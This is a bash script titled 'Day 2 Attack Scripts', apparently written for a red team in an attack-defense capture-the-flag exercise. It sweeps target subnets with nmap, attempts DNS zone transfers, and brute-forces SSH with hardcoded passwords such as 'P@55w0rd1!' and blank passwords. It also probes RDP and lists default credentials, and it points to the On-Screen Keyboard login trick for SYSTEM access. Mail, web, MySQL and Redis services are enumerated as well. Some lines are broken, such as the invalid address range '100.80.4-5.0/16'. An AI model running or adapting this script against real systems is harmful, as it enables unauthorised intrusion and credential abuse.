#!/bin/bash

echo "Day 2 Attack Scripts"
echo "==================="

echo "Network Scanner"
echo "=============="
for team in "4-5" "6-7" "8-9"; do
  echo "Scanning BT team $team..."
  nmap -sn 100.80.$team.0/16
done

echo "DNS Reconnaissance"
echo "================="
for team in "4" "6" "8"; do
  echo "DNS recon on BT team $team..."
  dig @100.80.$team.132 AXFR B4FFL3G4P.bslv.prod.ctf
done

echo "Service Enumeration"
echo "=================="
for team in "4" "6" "8"; do
  echo "Service enum on BT team $team..."
  nmap -sV -sC 100.80.$team.0/24
done

echo "SSH Brute Force"
echo "==============="
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing SSH on 100.80.$team.$ip..."
    sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 icanhasaccess@100.80.$team.$ip
    sshpass -p '' ssh -o ConnectTimeout=5 icanhasaccess@100.80.$team.$ip
    sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 goldteamscoring@100.80.$team.$ip
    sshpass -p '' ssh -o ConnectTimeout=5 goldteamscoring@100.80.$team.$ip
  done
done

echo "RDP Port Testing"
echo "================"
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing RDP port on 100.80.$team.$ip..."
    nc -zv 100.80.$team.$ip 3389 2>/dev/null
    if [ $? -eq 0 ]; then
      echo "RDP OPEN: 100.80.$team.$ip"
      echo "Use Microsoft Remote Desktop to connect:"
      echo "  - Administrator / P@55w0rd1!"
      echo "  - Administrator / (blank)"
      echo "  - icanhasaccess / P@55w0rd1!"
      echo "  - icanhasaccess / (blank)"
      echo "  - User / P@55w0rd1!"
      echo "  - User / (blank)"
      echo "  - Click OSK at login for SYSTEM access"
    fi
  done
done

echo "OSK RDP Attacks (On-Screen Keyboard)"
echo "===================================="
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing OSK RDP on 100.80.$team.$ip..."
    # Test RDP connection first
    nc -zv 100.80.$team.$ip 3389
    if [ $? -eq 0 ]; then
      echo "RDP port open on 100.80.$team.$ip - try manual RDP + OSK"
      echo "Command: xfreerdp /v:100.80.$team.$ip /u:Administrator /p:"
      echo "Then click On-Screen Keyboard at login for SYSTEM access"
    fi
  done
done

echo "Mail Server Enumeration"
echo "======================"
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing SMTP on 100.80.$team.$ip..."
    telnet 100.80.$team.$ip 25
    telnet 100.80.$team.$ip 587
  done
done

echo "Web Server Enumeration"
echo "====================="
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing HTTP on 100.80.$team.$ip..."
    curl -I http://100.80.$team.$ip
    curl -I https://100.80.$team.$ip
  done
done

echo "Database Enumeration"
echo "==================="
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing MySQL on 100.80.$team.$ip..."
    nmap -p 3306 --script mysql-info 100.80.$team.$ip
    echo "Testing Redis on 100.80.$team.$ip..."
    nmap -p 6379 --script redis-info 100.80.$team.$ip
  done
done

echo "Attack complete!" 